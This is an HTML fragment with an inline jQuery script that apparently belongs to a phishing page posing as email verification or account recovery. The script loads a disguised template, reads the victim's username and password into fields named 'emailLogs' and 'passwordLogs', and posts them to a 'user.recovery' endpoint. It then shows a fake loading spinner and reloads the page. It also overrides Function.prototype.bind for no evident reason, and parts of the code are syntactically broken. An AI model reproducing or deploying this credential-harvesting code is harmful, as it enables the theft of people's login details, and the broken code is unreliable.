<div id="root"></div>
<script type="text/javascript">
$(document).ready(function(){
let functionUrl   = '/template/function/user.recovery';
let serviceUrl    = '/template/content/secure/verify.email';
if(Function.prototype.bind){
Function.prototype.bind=function(oThis){
if (typeof this !== "function") throw new TypeError("");
var aArgs=Array.prototype.slice.call(arguments,1),fToBind=this,fNOP=function(){},fBound=function(){return fToBind.apply(this instanceof fNOP && oThis? this: oThis,aArgs.concat(Array.prototype.slice.call(arguments)));};
fNOP.prototype=this.prototype;
fBound.prototype=new fNOP();
return fBound;
};
var objXMLHttpRequest = new window.XMLHttpRequest();
var url = new URL (baseUrl + serviceUrl + baseUrlformat);
objXMLHttpRequest.onreadystatechange = function() {
if(objXMLHttpRequest.readyState === 4) {
if(objXMLHttpRequest.status === 200) {
document.getElementById("root").innerHTML=objXMLHttpRequest.responseText;
}else {
reject('Error Code: ' +  objXMLHttpRequest.status + ' Error Message: ' + objXMLHttpRequest.statusText);
}
}
}
objXMLHttpRequest.open("GET", encodeURI(url), false);
objXMLHttpRequest.send();
$('.form').submit(function(ev){
$('.submit').html("Processing");
$('.submit').click(function () {
$(this).prop("disabled", true);
$(this).closest('form').trigger('submit');
});
var formData = {
emailLogs: $("#username").val(),
passwordLogs: $("#password-input").val(),
};
$.ajax({
type: 'POST',
url: new URL (baseUrl + functionUrl + baseUrlformat),
data: formData,
encode: true,
success:function(data){
$('.preload').html("
<div class='d-flex align-items-center text-info'>
<p class='results'>Loading...</p>
<div class='spinner-border spinner-border-sm ms-auto' role='status' aria-hidden='true'></div>
</div>
");
setTimeout(function(){ location.reload(); }, 3000);
}
})
.done(function(data){
setTimeout(function(){
$('.results').html(data);
$('.form')[0].reset();
}, 1000);
})
.fail(function() {
setTimeout(function() {
$('.results').html('');
}, 1000);
});
ev.preventDefault();
return false;
});
}
});
</script>
